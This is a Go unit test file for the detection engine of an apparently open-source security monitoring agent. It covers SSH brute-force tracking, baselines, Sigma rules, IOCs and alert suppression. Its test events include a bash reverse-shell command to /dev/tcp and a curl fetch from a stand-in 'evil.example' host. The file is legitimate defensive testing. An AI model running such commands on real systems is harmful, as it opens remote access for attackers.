package detect

import (
	"context"
	"encoding/json"
	"io"
	"log/slog"
	"testing"
	"time"

	"github.com/aegis-soc/aegis/agent/internal/event"
	"github.com/aegis-soc/aegis/agent/internal/policy"
)

var t0 = time.Date(2026, 11, 12, 10, 0, 0, 0, time.UTC)

func sshFail(ip string, at time.Time) *event.Event {
	return &event.Event{Time: at, Kind: event.KindSSHFailed, SourceIp: ip, User: "root",
		Logsource: event.Logsource{Product: "linux", Service: event.ServiceSSHD}}
}

func TestSSHBruteForce(t *testing.T) {
	tr := NewSSHTracker()
	var hit bool
	for i := 0; i < 9; i++ {
		if _, ok := tr.Observe(sshFail("1.2.3.4", t0.Add(time.Duration(i)*time.Second)), 10, time.Minute, 5, 10*time.Minute); ok {
			t.Fatalf("fired early at %d", i)
		}
	}
	r, ok := tr.Observe(sshFail("1.2.3.4", t0.Add(9*time.Second)), 10, time.Minute, 5, 10*time.Minute)
	hit = ok && r.Brute && r.Failures == 10
	if !hit {
		t.Fatalf("expected brute force, got %+v %v", r, ok)
	}
	// different IP counted separately
	if _, ok := tr.Observe(sshFail("5.6.7.8", t0), 10, time.Minute, 5, 10*time.Minute); ok {
		t.Fatal("cross-ip leak")
	}
}

func TestSSHBruteForceWindowExpiry(t *testing.T) {
	tr := NewSSHTracker()
	for i := 0; i < 20; i++ { // one failure every 10s: never 10 within 60s
		if _, ok := tr.Observe(sshFail("1.2.3.4", t0.Add(time.Duration(i)*10*time.Second)), 10, time.Minute, 50, time.Hour); ok && i < 6 {
			t.Fatalf("slow attempts should not trip at %d", i)
		}
	}
}

func TestSSHSuccessAfterFailures(t *testing.T) {
	tr := NewSSHTracker()
	for i := 0; i < 5; i++ {
		tr.Observe(sshFail("9.9.9.9", t0.Add(time.Duration(i)*time.Minute)), 100, time.Minute, 5, 10*time.Minute)
	}
	acc := &event.Event{Time: t0.Add(6 * time.Minute), Kind: event.KindSSHAccepted, SourceIp: "9.9.9.9", User: "root"}
	r, ok := tr.Observe(acc, 100, time.Minute, 5, 10*time.Minute)
	if !ok || !r.SuccessAfter || r.Failures != 5 {
		t.Fatalf("%+v %v", r, ok)
	}
	acc2 := &event.Event{Time: t0.Add(7 * time.Minute), Kind: event.KindSSHAccepted, SourceIp: "8.8.8.8"}
	if _, ok := tr.Observe(acc2, 100, time.Minute, 5, 10*time.Minute); ok {
		t.Fatal("login without failures flagged")
	}
}

func TestBaselineEWMA(t *testing.T) {
	b := NewBaseline(0.2, 10)
	for i := 0; i < 10; i++ {
		v := b.Observe("m", 10+float64(i%3), 4)
		if !v.Learning && i < 9 {
			t.Fatalf("should still be learning at %d", i)
		}
	}
	vd := b.Observe("m", 11, 4)
	if vd.Learning || vd.Z > 2 || vd.Mean < 9 || vd.Mean > 13 {
		t.Fatalf("normal sample misscored: %+v", vd)
	}
	spike := b.Observe("m", 100, 4)
	if spike.Z < 4 {
		t.Fatalf("spike z=%.2f", spike.Z)
	}
	// damped update: baseline should not jump to the spike.
	after := b.Observe("m", 11, 4)
	if after.Mean > 30 {
		t.Fatalf("baseline poisoned: %+v", after)
	}
	// independent metrics
	if v := b.Observe("other", 1, 4); !v.Learning {
		t.Fatal("new metric must start in learning")
	}
}

func TestRareDest(t *testing.T) {
	r := NewRareDest(t0)
	learn := 10 * time.Minute
	if r.Observe("203.0.113.1", t0.Add(time.Minute), learn) {
		t.Fatal("alerted during learning")
	}
	if r.Observe("10.0.0.5", t0.Add(time.Hour), learn) {
		t.Fatal("private IP alerted")
	}
	if r.Observe("203.0.113.1", t0.Add(time.Hour), learn) {
		t.Fatal("learned destination alerted")
	}
	if !r.Observe("198.51.100.9", t0.Add(time.Hour), learn) {
		t.Fatal("new destination not alerted")
	}
	if r.Observe("198.51.100.9", t0.Add(time.Hour), learn) {
		t.Fatal("repeat destination alerted")
	}
}

func TestRing(t *testing.T) {
	r := NewRing(3, time.Hour)
	now := time.Now()
	for i := 0; i < 5; i++ {
		r.Add(event.Event{Time: now, ProcessId: i})
	}
	s := r.Snapshot(time.Time{})
	if len(s) != 3 || s[0].ProcessId != 2 || s[2].ProcessId != 4 {
		t.Fatalf("%+v", s)
	}
	r.Add(event.Event{Time: now.Add(-2 * time.Hour), ProcessId: 99})
	for _, e := range r.Snapshot(time.Time{}) {
		if e.ProcessId == 99 {
			t.Fatal("expired event returned")
		}
	}
}

func newTestEngine(t *testing.T) *Engine {
	e := NewEngine(slog.New(slog.NewTextHandler(io.Discard, nil)))
	return e
}

func drain(e *Engine) []event.Anomaly {
	var out []event.Anomaly
	for {
		select {
		case a := <-e.Anomalies():
			out = append(out, a)
		default:
			return out
		}
	}
}

func execEvent(cmd, img string) event.Event {
	return event.Event{Kind: event.KindExec, Image: img, CommandLine: cmd, User: "root",
		Logsource: event.Logsource{Product: "linux", Category: event.CategoryProcessCreation}}
}

func TestEngineSigmaAnomalyMetadata(t *testing.T) {
	e := newTestEngine(t)
	e.Process(context.Background(), execEvent("bash -i >& /dev/tcp/203.0.113.9/4444 0>&1", "/bin/bash"))
	as := drain(e)
	if len(as) != 1 {
		t.Fatalf("got %d anomalies: %+v", len(as), as)
	}
	a := as[0]
	if a.RuleSource != "sigma" || a.Severity != event.SevHigh || a.Category != "process" || a.Shadow ||
		len(a.AttackTags) == 0 || a.AttackTags[0] != "attack.execution" || len(a.Falsepositives) == 0 ||
		len(a.Fingerprint) != 64 || a.Evidence["CommandLine"] == nil || a.ID == "" {
		t.Fatalf("%+v", a)
	}
	if e.Ring().Len() != 1 {
		t.Fatal("event not buffered")
	}
}

func TestEngineDedupCooldownAndSuppression(t *testing.T) {
	e := newTestEngine(t)
	clock := t0
	e.now = func() time.Time { return clock }
	ev := execEvent("/tmp/x", "/tmp/x")
	e.Process(context.Background(), ev)
	e.Process(context.Background(), ev) // same fingerprint, inside cooldown
	as := drain(e)
	if len(as) != 1 {
		t.Fatalf("dedup failed: %d", len(as))
	}
	clock = clock.Add(10 * time.Minute)
	e.Process(context.Background(), ev)
	if len(drain(e)) != 1 {
		t.Fatal("anomaly should re-fire after cooldown")
	}

	// suppression
	clock = clock.Add(10 * time.Minute)
	fp := as[0].Fingerprint
	e.SetPolicy(&policy.Policy{Version: 2, Body: policy.Body{Thresholds: map[string]float64{},
		Suppressions: []policy.Suppression{{Fingerprint: fp, ExpiresAt: clock.Add(time.Hour).Format(time.RFC3339), Reason: "test"}}}})
	e.Process(context.Background(), ev)
	if n := len(drain(e)); n != 0 {
		t.Fatalf("suppressed anomaly emitted (%d)", n)
	}
	clock = clock.Add(2 * time.Hour) // suppression expired
	e.Process(context.Background(), ev)
	if len(drain(e)) != 1 {
		t.Fatal("expired suppression still active")
	}
}

func TestEngineShadowRuleFlag(t *testing.T) {
	e := newTestEngine(t)
	yaml := `title: Shadow whoami
id: 0b1c2d3e-4f50-4a6b-8c7d-9e0f1a2b3c4d
logsource: {product: linux, category: process_creation}
detection:
  s: {Image|endswith: /whoami}
  condition: s
level: low
tags: [attack.discovery, attack.t1033]
`
	e.SetPolicy(&policy.Policy{Version: 1, Body: policy.Body{Rules: []policy.Rule{
		{ID: "shadow1", Status: "shadow", YAML: yaml},
		{ID: "broken", Status: "active", YAML: "title: ["},
	}}})
	if len(e.RuleErrors()) != 1 || e.RuleErrors()[0].RuleID != "broken" {
		t.Fatalf("rule errors: %+v", e.RuleErrors())
	}
	e.Process(context.Background(), execEvent("whoami", "/usr/bin/whoami"))
	as := drain(e)
	if len(as) != 1 || !as[0].Shadow || as[0].Severity != event.SevLow {
		t.Fatalf("%+v", as)
	}
}

func TestEngineNativeAndIOC(t *testing.T) {
	e := newTestEngine(t)
	e.SetPolicy(&policy.Policy{Version: 1, Body: policy.Body{
		Thresholds: map[string]float64{KeyBruteCount: 3, KeyBruteWindow: 60},
		IOCs:       []policy.IOC{{Type: "ip", Value: "203.0.113.66"}, {Type: "domain", Value: "evil.example"}},
	}})
	ctx := context.Background()
	for i := 0; i < 3; i++ {
		e.Process(ctx, *sshFail("198.51.100.1", time.Now()))
	}
	as := drain(e)
	if len(as) != 1 || as[0].RuleID != "native:ssh_bruteforce" || as[0].Severity != event.SevHigh {
		t.Fatalf("%+v", as)
	}
	e.Process(ctx, event.Event{Kind: event.KindNetOutbound, DestinationIp: "203.0.113.66", DestinationPort: 443,
		Logsource: event.Logsource{Product: "linux", Category: event.CategoryNetworkConnection}})
	var ioc bool
	for _, a := range drain(e) {
		ioc = ioc || a.RuleID == "ioc:ip"
	}
	if !ioc {
		t.Fatal("ip IOC missed")
	}
	e.Process(ctx, execEvent("curl http://evil.example/x", "/usr/bin/curl"))
	var dom bool
	for _, a := range drain(e) {
		dom = dom || a.RuleID == "ioc:domain"
	}
	if !dom {
		t.Fatal("domain IOC missed")
	}
	e.Process(ctx, event.Event{Kind: event.KindNetListen, SourceIp: "0.0.0.0", SourcePort: 4444,
		Logsource: event.Logsource{Product: "linux", Category: event.CategoryNetworkConnection}})
	as = drain(e)
	if len(as) != 1 || as[0].RuleID != "native:new_listener" {
		t.Fatalf("%+v", as)
	}
}

func TestFIMNativeSkippedWhenSigmaCovers(t *testing.T) {
	e := newTestEngine(t)
	f := func(path string) event.Event {
		return event.Event{Kind: event.KindFileModified, TargetFilename: path, Sha256: "ab",
			Logsource: event.Logsource{Product: "linux", Category: event.CategoryFileEvent}}
	}
	e.Process(context.Background(), f("/home/a/.ssh/authorized_keys"))
	as := drain(e)
	if len(as) != 1 || as[0].RuleSource != "sigma" {
		t.Fatalf("want only the sigma anomaly: %+v", as)
	}
	e.Process(context.Background(), f("/etc/passwd"))
	as = drain(e)
	if len(as) != 1 || as[0].RuleID != "native:fim_change" || as[0].Severity != event.SevHigh {
		t.Fatalf("%+v", as)
	}
}

func TestBaselineTickAnomaly(t *testing.T) {
	e := newTestEngine(t)
	e.SetPolicy(&policy.Policy{Body: policy.Body{Thresholds: map[string]float64{KeyLearnSamples: 5, KeyZScore: 3}}})
	ctx := context.Background()
	for i := 0; i < 8; i++ {
		e.smu.Lock()
		e.counters["auth_failures_per_min"] = float64(1 + i%2)
		e.smu.Unlock()
		e.Tick(ctx)
	}
	if n := len(drain(e)); n != 0 {
		t.Fatalf("unexpected anomalies while stable: %d", n)
	}
	e.smu.Lock()
	e.counters["auth_failures_per_min"] = 80
	e.smu.Unlock()
	e.Tick(ctx)
	as := drain(e)
	if len(as) != 1 || as[0].RuleID != "baseline:auth_failures_per_min" || as[0].RuleSource != "baseline" {
		t.Fatalf("%+v", as)
	}
}

func TestFingerprintStable(t *testing.T) {
	if Fingerprint("r", "a", "b") != Fingerprint("r", "a", "b") || Fingerprint("r", "a", "b") == Fingerprint("r", "ab") {
		t.Fatal("fingerprint properties")
	}
}

func TestEvidenceBounded(t *testing.T) {
	e := newTestEngine(t)
	big := make([]byte, 100_000)
	for i := range big {
		big[i] = 'a'
	}
	ev := execEvent("/tmp/x "+string(big), "/tmp/x")
	ev.Extra = map[string]string{"k": string(big)}
	e.Process(context.Background(), ev)
	as := drain(e)
	if len(as) == 0 {
		t.Fatal("no anomaly")
	}
	if !evidenceSmall(as[0].Evidence) {
		t.Fatal("evidence exceeds 32KB")
	}
}

func evidenceSmall(m map[string]any) bool {
	b, _ := json.Marshal(m)
	return len(b) <= maxEvidenceBytes
}
